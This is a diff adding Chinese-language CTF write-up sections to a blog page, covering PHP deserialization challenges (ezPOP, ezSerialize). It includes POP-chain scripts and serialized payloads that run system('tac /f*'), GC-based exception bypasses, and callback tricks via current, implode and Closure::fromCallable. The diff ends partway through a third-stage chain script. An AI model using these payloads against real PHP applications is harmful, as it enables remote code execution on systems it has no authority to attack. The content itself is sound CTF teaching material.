@@ -312,7 +312,22 @@
         <li><a href="#解法二环境变量0代替bash">解法二：环境变量<code>$0</code>代替bash</a></li>
       </ol>
     </li>
-    <li><a href="#ezpop">ezPOP</a></li>
+    <li><a href="#ezpop">ezPOP</a>
+      <ol>
+        <li><a href="#用current">用current</a></li>
+        <li><a href="#用implode函数">用implode函数</a></li>
+        <li><a href="#wp做法用-closure-原生类的-fromcallable">wp做法：用 Closure 原生类的 fromCallable</a></li>
+      </ol>
+    </li>
+    <li><a href="#ezserialize">ezSerialize</a></li>
+    <li><a href="#ezclass">ezClass</a>
+      <ol>
+        <li><a href="#解法一利用可执行函数的内置类">解法一：利用可执行函数的内置类</a></li>
+        <li><a href="#解法二原生类读取splfileobject文件">解法二：原生类读取SplFileObject文件</a></li>
+        <li><a href="#解法三利用arrayiterator类调用current方法来返回当前的值">解法三:利用ArrayIterator类调用<code>current</code>方法来返回当前的值</a></li>
+      </ol>
+    </li>
+    <li><a href="#pharme"><strong>pharme</strong></a></li>
   </ol>
 </nav>
         </div>
@@ -381,7 +396,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 7 分钟
+                    阅读时长: 11 分钟
                 </time>
             </div>
         
@@ -1157,6 +1172,528 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>这里链子构造很简单，就是这么命令执行有点难搞，但是想也不用想，肯定是在call_user_func($a,$b)($c)($d);下功夫。</p>
+<p>call_user_func($a,$b)意思就是函数a将b作为参数调用，call_user_func($a,$b)($c)($d);这个就是嵌套了，call_user_func($a,$b)返回值作为函数调用c，然后其返回值又作为函数调用d。这有很多解法。</p>
+<h3 id="用current">用current
+</h3><p>写一个测试代码试试,解释些函数</p>
+<p><code>current()函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的&quot;当前&quot;元素，初始指向插入到数组中的第一个元素</code>。其实就是返回数组第一个元素.（由于此题post是数组，所以只需要传b=sprintf就行）</p>
+<p><code>sprintf() 函数把格式化的字符串写入变量中。</code></p>
+<p>然后就是<code>unse</code>t函数：<a class="link" href="https://www.runoob.com/php/php-unset-function.html"  target="_blank" rel="noopener"
+    >PHP unset() 函数 | 菜鸟教程</a>，unset看似会回收a，其实不影响，因为当执行 <code>$b = $_POST</code> 时，<code>$b</code> 是 <code>$_POST</code> 的独立副本。后续的 <code>unset($b['a'])</code> 只移除了副本中的 <code>a</code>，<strong>原始 <code>$_POST['a']</code> 的值依然存在</strong>，所以不影响</p>
+<img src="image-20250414203221638.png" alt="image-20250414203221638" style="zoom:33%;" />
+<p>最终payload是:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">AAA</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">BBB</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CCC</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">CCC</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">c</span><span class="o">=</span><span class="k">new</span> <span class="nx">AAA</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">c</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">c</span><span class="o">-&gt;</span><span class="na">s</span><span class="o">=</span><span class="k">new</span> <span class="nx">BBB</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">c</span><span class="o">-&gt;</span><span class="na">s</span><span class="o">-&gt;</span><span class="na">c</span><span class="o">=</span><span class="s2">&#34;system&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">c</span><span class="o">-&gt;</span><span class="na">s</span><span class="o">-&gt;</span><span class="na">d</span><span class="o">=</span><span class="s2">&#34;tac /f*&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是题目最后又<code>throw new Exception(&quot;noooooob!!!&quot;);</code>,<strong>这里考GC垃圾回收</strong>：<a class="link" href="https://xz.aliyun.com/news/11289#toc-0"  target="_blank" rel="noopener"
+    >浅析PHP GC垃圾回收机制及常见利用方式-先知社区</a></p>
+<p><code>绕过的第一个方法的话就是将payload去掉最后一个}</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:3:&#34;CCC&#34;:1:{s:1:&#34;c&#34;;O:3:&#34;AAA&#34;:2:{s:1:&#34;s&#34;;O:3:&#34;BBB&#34;:2:{s:1:&#34;c&#34;;s:6:&#34;system&#34;;s:1:&#34;d&#34;;s:7:&#34;tac /f*&#34;;}s:1:&#34;a&#34;;s:1:&#34;1&#34;;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>post传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=current&amp;b=sprintf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>第二个方法，就是将echo serialize($a);改为echo serialize(array($a,0));</code></p>
+<p>得到的payload是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a:2:{i:0;O:3:&#34;CCC&#34;:1:{s:1:&#34;c&#34;;O:3:&#34;AAA&#34;:2:{s:1:&#34;s&#34;;O:3:&#34;BBB&#34;:2:{s:1:&#34;c&#34;;s:6:&#34;system&#34;;s:1:&#34;d&#34;;s:7:&#34;tac /f*&#34;;}s:1:&#34;a&#34;;s:1:&#34;1&#34;;}}i:1;i:0;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后看上文GC垃圾回收知道将array($a,0)第二个索引置空</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a:2:{i:0;O:3:&#34;CCC&#34;:1:{s:1:&#34;c&#34;;O:3:&#34;AAA&#34;:2:{s:1:&#34;s&#34;;O:3:&#34;BBB&#34;:2:{s:1:&#34;c&#34;;s:6:&#34;system&#34;;s:1:&#34;d&#34;;s:7:&#34;tac /f*&#34;;}s:1:&#34;a&#34;;s:1:&#34;1&#34;;}}i:0;i:0;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后post一样就行。</p>
+<p><strong>当然这里post还可以传</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=current&amp;b=current
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>但是这样的话$a-&gt;c-&gt;s-&gt;c=&ldquo;system&rdquo;;就要变成$a-&gt;c-&gt;s-&gt;c=array(&ldquo;system&rdquo;);因为current只能处理数组</strong></p>
+<h3 id="用implode函数">用implode函数
+</h3><p>这个nb，又涨知识<a class="link" href="https://www.w3school.com.cn/php/func_string_implode.asp"  target="_blank" rel="noopener"
+    >PHP implode() 函数</a></p>
+<p><code>implode()</code> 函数返回由数组元素组合成的字符串。</p>
+<img src="image-20250414230056581.png" alt="image-20250414230056581" style="zoom:50%;" />
+<p>也是很好理解，所以就可以post传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=implode&amp;1=imp&amp;2=lode
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>get和上面一样</p>
+<h3 id="wp做法用-closure-原生类的-fromcallable">wp做法：用 Closure 原生类的 fromCallable
+</h3><p>[PHP: Closure::fromCallable - Manual](<a class="link" href="https://www.php.net/manual/zh/closure.fromcallable.php#:~:text=Closure%3A%3AfromCallable"  target="_blank" rel="noopener"
+    >https://www.php.net/manual/zh/closure.fromcallable.php#:~:text=Closure%3A%3AfromCallable</a> — 将 callable 转换为闭包 使用当前范围从给定的 callback 创建并返回一个新的,从 PHP 8.1.0 开始， First-class 可调用语法 的语义与此方法相同。 要转换的回调。)</p>
+<p>详细讲解看上面。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">函数 myCustomMapper 函数接受一个回调函数和一个字符串作为参数。它将字符串按空格拆分为单词数组，然后对每个单词应用回调函数，并将结果以空格连接起来，最终返回处理后的字符串
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以post传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=Closure::fromCallable&amp;0=Closure&amp;1=fromCallable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">这里的解释就是参数二次调用出 Closure::fromCallable 然后 Closure 加载后面第一个参数 system 形成回调函数然后加载第二个参数变成 system 的参数
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>get传一样。在这里感觉和implode差不多作用</p>
+<h2 id="ezserialize">ezSerialize
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Flag</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Flag</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=&amp;</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>考php的引用<a class="link" href="https://www.cnblogs.com/alsf/p/9621362.html"  target="_blank" rel="noopener"
+    >PHP引用(&amp;)使用详解 - 美好的明天 - 博客园</a></p>
+<p>一个引用相等直接绕过，得到路由<strong>fpclosefpclosefpcloseffflllaaaggg.php</strong></p>
+<p><a class="link" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize"  target="_blank" rel="noopener"
+    >PHP: 魔术方法 - Manual</a></p>
+<p>第二关有个__unserialize魔术，但是要7.4以上才可以用，题目是7.3，所以不考虑此魔术，而且如果你逆推链子也可以发现这里用不了。</p>
+<img src="image-20250418182321247.png" alt="image-20250418182321247" style="zoom:50%;" />
+<p>接下来链子就简单了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$mack</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mack</span><span class="o">-&gt;</span><span class="na">nonExistentMethod</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$luo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;o.O&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">luo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$wang1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$wang1</span><span class="p">,</span><span class="nv">$wang2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">D</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$lao</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$chen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;O.o&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">is_null</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">chen</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&#34;&#34;</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">chen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">E</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;xxxxx&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$num</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;学到就是赚到!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">!=</span><span class="s1">&#39;&#39;</span> <span class="o">||</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">num</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;旅行者别忘记旅行的意义!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">E</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="k">new</span> <span class="nx">D</span><span class="p">();</span>	<span class="c1">#$this-&gt;name = &#39;&#39;拿来跟字符串比较了，因此也会调用__toString方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">=</span><span class="k">new</span> <span class="nx">B</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">luo</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">-&gt;</span><span class="na">lao</span><span class="o">-&gt;</span><span class="na">luo</span><span class="o">-&gt;</span><span class="na">mack</span><span class="o">=</span><span class="k">new</span> <span class="nx">C</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>得到saber_master_saber_master.php</strong>，进入第三关</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO1</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$T1ng</span><span class="o">=</span><span class="s2">&#34;yuroandCMD258&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span><span class="o">=</span><span class="s2">&#34;dev1l&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO2</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$crypto0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$adwa</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">XYCTFNO3</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$KickyMu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$fpclose</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$N1ght</span> <span class="o">=</span> <span class="s2">&#34;oSthing&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">XYCTFNO3</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">KickyMu</span><span class="o">=</span><span class="k">new</span> <span class="nx">XYCTFNO2</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">KickyMu</span><span class="o">-&gt;</span><span class="na">adwa</span><span class="o">=</span><span class="k">new</span> <span class="nx">XYCTFNO1</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
